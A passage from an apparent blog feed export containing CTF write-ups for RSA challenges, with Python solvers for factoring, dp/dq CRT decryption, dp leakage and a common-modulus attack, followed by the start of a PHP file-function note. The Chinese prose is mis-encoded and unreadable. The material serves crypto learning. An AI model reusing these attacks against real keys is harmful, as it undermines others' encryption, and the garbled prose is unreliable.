class="hljs-comment">#3.m=pow(c,d,n)</span><br>m = gmpy2.powmod(c,d,n) <br>print(binascii.unhexlify(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br><span class="hljs-comment">#binascii.unhexlify(hexstr):ä»åå…­è¿›åˆ¶å­—ç¬¦ä¸²hexstrè¿”å›äºŒè¿›åˆ¶æ•°æ®</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬<br><img src="https://img-blog.csdnimg.cn/202010042008171.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ³¨ï¼š<br>1.åœ¨çº¿åˆ†è§£è´¨å› æ•°ï¼š<a href="http://www.factordb.com/">http://www.factordb.com</a> </p><p>2.ä»£ç ä¸­æ¶‰åŠåˆ°äº†<a href="https://blog.csdn.net/xc_zhou/article/details/82079762">pythonä¹‹binasciiæ¨¡å—</a>ç›¸å…³çŸ¥è¯†</p><h3 id="4-4-å·²çŸ¥public-keyã€å¯†æ–‡cï¼Œæ±‚æ˜æ–‡m"><a href="#4-4-å·²çŸ¥public-keyã€å¯†æ–‡cï¼Œæ±‚æ˜æ–‡m" class="headerlink" title="4.4 å·²çŸ¥public keyã€å¯†æ–‡cï¼Œæ±‚æ˜æ–‡m"></a>4.4 å·²çŸ¥public keyã€å¯†æ–‡cï¼Œæ±‚æ˜æ–‡m</h3><p> <strong>[BUUCTF]RSA</strong><br>ä¸‹è½½é™„ä»¶<br><img src="https://img-blog.csdnimg.cn/20201011162231603.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç”¨è®°äº‹æœ¬æ‰“å¼€pub.key<br><img src="https://img-blog.csdnimg.cn/20201011162321313.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><a href="http://tool.chacuo.net/cryptrsakeyparse">è§£æå…¬é’¥</a><br><img src="https://img-blog.csdnimg.cn/20201011162453842.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ¨¡æ•°å’ŒæŒ‡æ•°å³ä¸ºnå’Œeï¼Œè¿˜éœ€è¦æŠŠnä»åå…­è¿›åˆ¶è½¬æ¢ä¸ºåè¿›åˆ¶<br><img src="https://img-blog.csdnimg.cn/20201011162645687.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><a href="http://www.factordb.com/">åˆ†è§£n</a>ï¼Œå¾—åˆ°på’Œq</p><p><img src="https://img-blog.csdnimg.cn/20201011162813249.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>æ¥ä¸‹æ¥å°±æ˜¯é€šè¿‡è„šæœ¬æ±‚å‡ºæ˜æ–‡m</p><p>è„šæœ¬éœ€è¦ç”¨åˆ°pythonçš„rsaåº“ï¼Œåœ¨cmdä¸­è¾“å…¥<code>pip install rsa</code>å³å¯å®Œæˆå®‰è£…<br><img src="https://img-blog.csdnimg.cn/20201011163120354.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> gmpy2<br><span class="hljs-keyword">import</span> rsa<br> <br>e=<span class="hljs-number">65537</span><br>n=<span class="hljs-number">86934482296048119190666062003494800588905656017203025617216654058378322103517</span><br>p=<span class="hljs-number">285960468890451637935629440372639283459</span><br>q=<span class="hljs-number">304008741604601924494328155975272418463</span><br> <br>phin = (p-<span class="hljs-number">1</span>) * (q-<span class="hljs-number">1</span>)<br>d=gmpy2.invert(e, phin)<br> <br>key=rsa.PrivateKey(n,e,<span class="hljs-built_in">int</span>(d),p,q)<br> <br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.enc&quot;</span>,<span class="hljs-string">&quot;rb&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    f=f.read()<br>    print(rsa.decrypt(f,key))<br><br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬ï¼Œå¾—åˆ°flagã€‚<br><img src="https://img-blog.csdnimg.cn/20201011163224705.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="4-5-å·²çŸ¥pã€qã€dpã€dqã€cæ±‚æ˜æ–‡m"><a href="#4-5-å·²çŸ¥pã€qã€dpã€dqã€cæ±‚æ˜æ–‡m" class="headerlink" title="4.5 å·²çŸ¥pã€qã€dpã€dqã€cæ±‚æ˜æ–‡m"></a>4.5 å·²çŸ¥pã€qã€dpã€dqã€cæ±‚æ˜æ–‡m</h3><p><strong>[BUUCTF]RSA1</strong></p><p>è¿™é“é¢˜å±äºå·²çŸ¥pã€qã€dpã€dqã€cæ±‚æ˜æ–‡ç±»å‹<br><img src="https://img-blog.csdnimg.cn/20201005193829462.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br><a href="https://blog.csdn.net/MikeCoke/article/details/105959599">ä¸Šè„šæœ¬</a></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python">p = <span class="hljs-number">8637633767257008567099653486541091171320491509433615447539162437911244175885667806398411790524083553445158113502227745206205327690939504032994699902053229</span> <br>q = <span class="hljs-number">12640674973996472769176047937170883420927050821480010581593137135372473880595613737337630629752577346147039284030082593490776630572584959954205336880228469</span> <br>dp = <span class="hljs-number">6500795702216834621109042351193261530650043841056252930930949663358625016881832840728066026150264693076109354874099841380454881716097778307268116910582929</span> <br>dq = <span class="hljs-number">783472263673553449019532580386470672380574033551303889137911760438881683674556098098256795673512201963002175438762767516968043599582527539160811120550041</span> <br>c = <span class="hljs-number">24722305403887382073567316467649080662631552905960229399079107995602154418176056335800638887527614164073530437657085079676157350205351945222989351316076486573599576041978339872265925062764318536089007310270278526159678937431903862892400747915525118983959970607934142974736675784325993445942031372107342103852</span><br><br><span class="hljs-keyword">import</span> gmpy2<br>I = gmpy2.invert(q,p)<br>mp = <span class="hljs-built_in">pow</span>(c,dp,p)<br>mq = <span class="hljs-built_in">pow</span>(c,dq,q)               <span class="hljs-comment">#æ±‚å¹‚å–æ¨¡è¿ç®—</span><br><br>m = (((mp-mq)*I)%p)*q+mq       <span class="hljs-comment">#æ±‚æ˜æ–‡å…¬å¼</span><br><br>print(<span class="hljs-built_in">hex</span>(m))                  <span class="hljs-comment">#è½¬ä¸ºåå…­è¿›åˆ¶</span><br><br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬<br><img src="https://img-blog.csdnimg.cn/20201005194550372.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>ç„¶åå°†16è¿›åˆ¶è½¬æ¢æˆå­—ç¬¦ä¸²</p><p><img src="https://img-blog.csdnimg.cn/20201005194804576.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="4-6å·²çŸ¥nã€eã€dpã€cï¼Œæ±‚m"><a href="#4-6å·²çŸ¥nã€eã€dpã€cï¼Œæ±‚m" class="headerlink" title="4.6å·²çŸ¥nã€eã€dpã€cï¼Œæ±‚m"></a>4.6å·²çŸ¥nã€eã€dpã€cï¼Œæ±‚m</h3><p><strong>[BUUCTF]RSA2</strong></p><p>ä¸‹è½½é™„ä»¶ï¼Œé¢˜ç›®ç»™å‡ºå…¬é’¥n,eä»¥åŠdp<br><img src="https://img-blog.csdnimg.cn/20201011163855598.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">dp=d%(p-<span class="hljs-number">1</span>)<br></code></pre></td></tr></table></figure><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span>  gmpy2<br><span class="hljs-keyword">import</span>  rsa<br><span class="hljs-keyword">import</span>  binascii<br>p=<span class="hljs-number">0</span><br>e=<span class="hljs-number">65537</span><br>c = <span class="hljs-number">140423670976252696807533673586209400575664282100684119784203527124521188996403826597436883766041879067494280957410201958935737360380801845453829293997433414188838725751796261702622028587211560353362847191060306578510511380965162133472698713063592621028959167072781482562673683090590521214218071160287665180751</span><br>dp=<span class="hljs-number">905074498052346904643025132879518330691925174573054004621877253318682675055421970943552016695528560364834446303196939207056642927148093290374440210503657</span><br>n=<span class="hljs-number">248254007851526241177721526698901802985832766176221609612258877371620580060433101538328030305219918697643619814200930679612109885533801335348445023751670478437073055544724280684733298051599167660303645183146161497485358633681492129668802402065797789905550489547645118787266601929429724133167768465309665906113</span><br>temp=dp*e<br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,e) :<br>    <span class="hljs-keyword">if</span> (temp-<span class="hljs-number">1</span>)%i==<span class="hljs-number">0</span>:<br>        x=(temp-<span class="hljs-number">1</span>)//i+<span class="hljs-number">1</span><br>        y=n%x<br>        <span class="hljs-keyword">if</span> y==<span class="hljs-number">0</span>:<br>            p=x<br>            <span class="hljs-keyword">break</span><br>q=n//p<br><span class="hljs-comment">#&#x27;//&#x27;ä»£è¡¨å‘ä¸‹å–æ•´,&#x27;/&#x27;å¾—åˆ°çš„æ˜¯æµ®ç‚¹æ•°</span><br>d=gmpy2.invert(e,(p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>))<br>key=rsa.PrivateKey(n,e,d,p,q)<br>m=<span class="hljs-built_in">pow</span>(c,d,n)<br>print(binascii.unhexlify(<span class="hljs-built_in">hex</span>(m)[<span class="hljs-number">2</span>:]))<br><span class="hljs-comment">#unhexlify()çš„ä½œç”¨æ˜¯è¿”å›16è¿›åˆ¶æ•°å¯¹åº”çš„å­—ç¬¦ä¸²</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœ<br><img src="https://img-blog.csdnimg.cn/20201011164021212.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="4-7å…±æ¨¡æ”»å‡»"><a href="#4-7å…±æ¨¡æ”»å‡»" class="headerlink" title="4.7å…±æ¨¡æ”»å‡»"></a>4.7å…±æ¨¡æ”»å‡»</h3><p><strong>[BUUCTF]RSA3</strong><br>å‡ºç°ä¸¤ä¸ªåŠ å¯†ä½¿ç”¨ç›¸åŒçš„æ¨¡ï¼Œå¯ä»¥åœ¨ä¸çŸ¥é“ç§é’¥çš„æƒ…å†µä¸‹å¾—åˆ°æ˜æ–‡ï¼Œè¿™å°±æ˜¯RSAä¸­çš„<strong>å…±æ¨¡æ”»å‡»</strong>ã€‚<br><img src="https://img-blog.csdnimg.cn/20201011164858631.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> invert<br><span class="hljs-comment"># æ¬§å‡ é‡Œå¾—ç®—æ³•</span><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">egcd</span>(<span class="hljs-params">a, b</span>):</span><br>  <span class="hljs-keyword">if</span> a == <span class="hljs-number">0</span>:<br>    <span class="hljs-keyword">return</span> (b, <span class="hljs-number">0</span>, <span class="hljs-number">1</span>)<br>  <span class="hljs-keyword">else</span>:<br>    g, y, x = egcd(b % a, a)<br>    <span class="hljs-keyword">return</span> (g, x - (b // a) * y, y)<br><br><span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">main</span>():</span><br>  n = <span class="hljs-number">22708078815885011462462049064339185898712439277226831073457888403129378547350292420267016551819052430779004755846649044001024141485283286483130702616057274698473611149508798869706347501931583117632710700787228016480127677393649929530416598686027354216422565934459015161927613607902831542857977859612596282353679327773303727004407262197231586324599181983572622404590354084541788062262164510140605868122410388090174420147752408554129789760902300898046273909007852818474030770699647647363015102118956737673941354217692696044969695308506436573142565573487583507037356944848039864382339216266670673567488871508925311154801</span><br>  c1 = <span class="hljs-number">22322035275663237041646893770451933509324701913484303338076210603542612758956262869640822486470121149424485571361007421293675516338822195280313794991136048140918842471219840263536338886250492682739436410013436651161720725855484866690084788721349555662019879081501113222996123305533009325964377798892703161521852805956811219563883312896330156298621674684353919547558127920925706842808914762199011054955816534977675267395009575347820387073483928425066536361482774892370969520740304287456555508933372782327506569010772537497541764311429052216291198932092617792645253901478910801592878203564861118912045464959832566051361</span><br>  c2 = <span class="hljs-number">18702010045187015556548691642394982835669262147230212731309938675226458555210425972429418449273410535387985931036711854265623905066805665751803269106880746769003478900791099590239513925449748814075904017471585572848473556490565450062664706449128415834787961947266259789785962922238701134079720414228414066193071495304612341052987455615930023536823801499269773357186087452747500840640419365011554421183037505653461286732740983702740822671148045619497667184586123657285604061875653909567822328914065337797733444640351518775487649819978262363617265797982843179630888729407238496650987720428708217115257989007867331698397</span><br>  e1 = <span class="hljs-number">11187289</span><br>  e2 = <span class="hljs-number">9647291</span><br>  s = egcd(e1, e2)<br>  s1 = s[<span class="hljs-number">1</span>]<br>  s2 = s[<span class="hljs-number">2</span>]<br>  <span class="hljs-comment"># æ±‚æ¨¡åå…ƒç´ </span><br>  <span class="hljs-keyword">if</span> s1&lt;<span class="hljs-number">0</span>:<br>    s1 = - s1<br>    c1 = invert(c1, n)<br>  <span class="hljs-keyword">elif</span> s2&lt;<span class="hljs-number">0</span>:<br>    s2 = - s2<br>    c2 = invert(c2, n)<br><br>  m = <span class="hljs-built_in">pow</span>(c1,s1,n)*<span class="hljs-built_in">pow</span>(c2,s2,n) % n<br>  print(m)<br><br><span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">&#x27;__main__&#x27;</span>:<br>  main()<br><br><br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬ï¼Œå¾—åˆ°æ˜æ–‡m<br><img src="https://img-blog.csdnimg.cn/20201011164737363.png#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"><br>è½¬16è¿›åˆ¶</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">666</span>c61677b34396439313037376131616263623134663161396435343663383062653965667d<br></code></pre></td></tr></table></figure><p>åå…­è¿›åˆ¶è½¬å­—ç¬¦ä¸²<br><img src="https://img-blog.csdnimg.cn/20201109201954658.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><h3 id="4-8å·²çŸ¥p-qã€ï¼ˆp-1-q-1-ã€eã€dã€ä»¥åŠå¯†æ–‡Cï¼Œæ±‚æ˜æ–‡m"><a href="#4-8å·²çŸ¥p-qã€ï¼ˆp-1-q-1-ã€eã€dã€ä»¥åŠå¯†æ–‡Cï¼Œæ±‚æ˜æ–‡m" class="headerlink" title="4.8å·²çŸ¥p+qã€ï¼ˆp+1)(q+1)ã€eã€dã€ä»¥åŠå¯†æ–‡Cï¼Œæ±‚æ˜æ–‡m"></a>4.8å·²çŸ¥p+qã€ï¼ˆp+1)(q+1)ã€eã€dã€ä»¥åŠå¯†æ–‡Cï¼Œæ±‚æ˜æ–‡m</h3><p><strong>[GUET-CTF2019]BabyRSA</strong><br><img src="https://img-blog.csdnimg.cn/20210201110739494.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><p>å·²çŸ¥<code>p+q</code>ã€<code>ï¼ˆp+1)(q+1</code>)ã€<code>e</code>ã€<code>d</code>,ä»¥åŠå¯†æ–‡<code>c</code>.</p><p>åˆ©ç”¨ RSAçš„è§£å¯†å…¬å¼ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">M=C^d  mod n<br>n = p*q<br></code></pre></td></tr></table></figure><p>æ‰€ä»¥æ¨ç®—å‡ºæ±‚nçš„å…¬å¼</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">n = (p+<span class="hljs-number">1</span>)*(q+<span class="hljs-number">1</span>) - (p+q) - <span class="hljs-number">1</span><br></code></pre></td></tr></table></figure><p>è„šæœ¬</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> libnum<br>a = <span class="hljs-number">0x1232fecb92adead91613e7d9ae5e36fe6bb765317d6ed38ad890b4073539a6231a6620584cea5730b5af83a3e80cf30141282c97be4400e33307573af6b25e2ea</span><br>b = <span class="hljs-number">0x5248becef1d925d45705a7302700d6a0ffe5877fddf9451a9c1181c4d82365806085fd86fbaab08b6fc66a967b2566d743c626547203b34ea3fdb1bc06dd3bb765fd8b919e3bd2cb15bc175c9498f9d9a0e216c2dde64d81255fa4c05a1ee619fc1fc505285a239e7bc655ec6605d9693078b800ee80931a7a0c84f33c851740</span><br>e = <span class="hljs-number">0xe6b1bee47bd63f615c7d0a43c529d219</span><br>d = <span class="hljs-number">0x2dde7fbaed477f6d62838d55b0d0964868cf6efb2c282a5f13e6008ce7317a24cb57aec49ef0d738919f47cdcd9677cd52ac2293ec5938aa198f962678b5cd0da344453f521a69b2ac03647cdd8339f4e38cec452d54e60698833d67f9315c02ddaa4c79ebaa902c605d7bda32ce970541b2d9a17d62b52df813b2fb0c5ab1a5</span><br>c= <span class="hljs-number">0x50ae00623211ba6089ddfae21e204ab616f6c9d294e913550af3d66e85d0c0693ed53ed55c46d8cca1d7c2ad44839030df26b70f22a8567171a759b76fe5f07b3c5a6ec89117ed0a36c0950956b9cde880c575737f779143f921d745ac3bb0e379c05d9a3cc6bf0bea8aa91e4d5e752c7eb46b2e023edbc07d24a7c460a34a9a</span><br><br>n = b-a-<span class="hljs-number">1</span><br><br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><br>print(libnum.n2s(m))  <span class="hljs-comment">#ï¼ˆn2så°†æ•°å€¼è½¬åŒ–ä¸ºå­—ç¬¦ä¸²ï¼‰</span><br></code></pre></td></tr></table></figure><p>è¿è¡Œè„šæœ¬<br><img src="https://img-blog.csdnimg.cn/20210201111109395.png" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p><hr><p>çœ‹åˆ°ä¸€ä»½æ¥è‡ªæ¼æ–—ç¤¾åŒºçš„<a href="https://www.freebuf.com/column/148898.html">RSAè§£é¢˜æ€è·¯æ€ç»´å¯¼å›¾</a>ï¼Œæ”¶è—èµ·æ¥8ã€‚</p><p><img src="https://img-blog.csdnimg.cn/20201004175237397.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQ2MTUwOTQw,size_16,color_FFFFFF,t_70#pic_center" alt="åœ¨è¿™é‡Œæ’å…¥å›¾ç‰‡æè¿°"></p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
      <category>CRYPTO</category>
      
    </categories>
    
    
    <tags>
      
      <tag>RSA</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>PHP æ–‡ä»¶ä¸ç›®å½•æ“ä½œ</title>
    <link href="/2020/09/20/PHP%20%E6%96%87%E4%BB%B6%E4%B8%8E%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C/"/>
    <url>/2020/09/20/PHP%20%E6%96%87%E4%BB%B6%E4%B8%8E%E7%9B%AE%E5%BD%95%E6%93%8D%E4%BD%9C/</url>
    
    <content type="html"><![CDATA[<p>æ‘˜è¦ï¼šPHPå­¦ä¹ ç¬”è®°ï¼ˆå››ï¼‰</p> <a id="more"></a><h2 id="ä¸€ã€åˆ¤æ–­æ™®é€šæ–‡ä»¶å’Œç›®å½•"><a href="#ä¸€ã€åˆ¤æ–­æ™®é€šæ–‡ä»¶å’Œç›®å½•" class="headerlink" title="ä¸€ã€åˆ¤æ–­æ™®é€šæ–‡ä»¶å’Œç›®å½•"></a>ä¸€ã€åˆ¤æ–­æ™®é€šæ–‡ä»¶å’Œç›®å½•</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">1.</span>is_file()<br>åˆ¤æ–­ç»™å®šæ–‡ä»¶åæ˜¯å¦ä¸ºä¸€ä¸ªæ­£å¸¸çš„æ–‡ä»¶<br>è¯­æ³•ï¼šis_file(file)   <span class="hljs-comment">//è§„å®šè¦æ£€æŸ¥çš„æ–‡ä»¶ã€‚</span><br>å¦‚æœæ–‡ä»¶æ˜¯å¸¸è§„çš„æ–‡ä»¶ï¼Œè¯¥å‡½æ•°è¿”å› <span class="hljs-literal">TRUE</span>ã€‚<br><br><span class="hljs-number">2.</span>is_dir()<br>åˆ¤æ–­ç»™å®šæ–‡ä»¶åæ˜¯å¦æ˜¯ä¸€ä¸ªç›®å½•<br>è¯­æ³•: is_dir(file)<br>å¦‚æœæ–‡ä»¶åå­˜åœ¨å¹¶ä¸”ä¸ºç›®å½•ï¼Œåˆ™è¿”å› <span class="hljs-literal">true</span>ã€‚å¦‚æœ file æ˜¯ä¸€ä¸ªç›¸å¯¹è·¯å¾„ï¼Œåˆ™æŒ‰ç…§å½“å‰å·¥ä½œç›®å½•æ£€æŸ¥å…¶ç›¸å¯¹è·¯å¾„ã€‚<br></code></pre></td></tr></table></figure><h2 id="äºŒã€æ–‡ä»¶çš„å±æ€§"><a href="#äºŒã€æ–‡ä»¶çš„å±æ€§" class="headerlink" title="äºŒã€æ–‡ä»¶çš„å±æ€§"></a>äºŒã€æ–‡ä»¶çš„å±æ€§</h2><p>1.<code>file_exists()</code><br>æ£€æŸ¥æ–‡ä»¶æˆ–ç›®å½•æ˜¯å¦å­˜åœ¨</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">è¯­æ³•ï¼šfile_exists(path)   <span class="hljs-comment">//pathä¸ºè§„å®šè¦æ£€æŸ¥çš„è·¯å¾„ã€‚</span><br></code></pre></td></tr></table></figure><p>å¦‚æœæŒ‡å®šçš„æ–‡ä»¶æˆ–ç›®å½•å­˜åœ¨åˆ™è¿”å› trueï¼Œå¦åˆ™è¿”å› falseã€‚</p><p>2.<code>filesize()</code><br>å–å¾—æ™®é€šæ–‡ä»¶å¤§å°</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">è¯­æ³•: filesize(filename)  <span class="hljs-comment">//filenameä¸ºè§„å®šè¦æ£€æŸ¥çš„æ–‡ä»¶ã€‚</span><br></code></pre></td></tr></table></figure><p>è‹¥æˆåŠŸï¼Œåˆ™è¿”å›æ–‡ä»¶å¤§å°çš„å­—èŠ‚æ•°ã€‚è‹¥å¤±è´¥ï¼Œåˆ™è¿”å› false å¹¶ç”Ÿæˆä¸€æ¡ E_WARNING çº§çš„é”™è¯¯ã€‚</p><p>3.<code>is_readable()</code><br>åˆ¤æ–­ç»™å®šæ–‡ä»¶åæ˜¯å¦å¯è¯»</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">è¯­æ³•: is_readable(file)<br></code></pre></td></tr></table></figure><p>å¦‚æœç”± file æŒ‡å®šçš„æ–‡ä»¶æˆ–ç›®å½•å­˜åœ¨å¹¶ä¸”å¯è¯»ï¼Œåˆ™è¿”å› TRUEã€‚</p><p>4.<code>is_writable()</code><br>åˆ¤æ–­ç»™å®šçš„æ–‡ä»¶åæ˜¯å¦å¯å†™</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">è¯­æ³•: is_writable(file)<br></code></pre></td></tr></table></figure><p>å¦‚æœæ–‡ä»¶å­˜åœ¨å¹¶ä¸”å¯å†™åˆ™è¿”å› trueã€‚file å‚æ•°å¯ä»¥æ˜¯ä¸€ä¸ªå…è®¸è¿›è¡Œæ˜¯å¦å¯å†™æ£€æŸ¥çš„ç›®å½•åã€‚</p><p>5.<code>filectime()</code><br>è·å–æŒ‡å®šæ–‡ä»¶çš„ä¸Šæ¬¡è®¿é—®æ—¶é—´ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">è¯­æ³•: fileatime(filename)<br></code></pre></td></tr></table></figure><p>è¯¥å‡½æ•°è¿”å›æ–‡ä»¶ä¸Šæ¬¡è¢«è®¿é—®çš„æ—¶é—´ã€‚å¦‚æœå‡ºé”™åˆ™è¿”å› 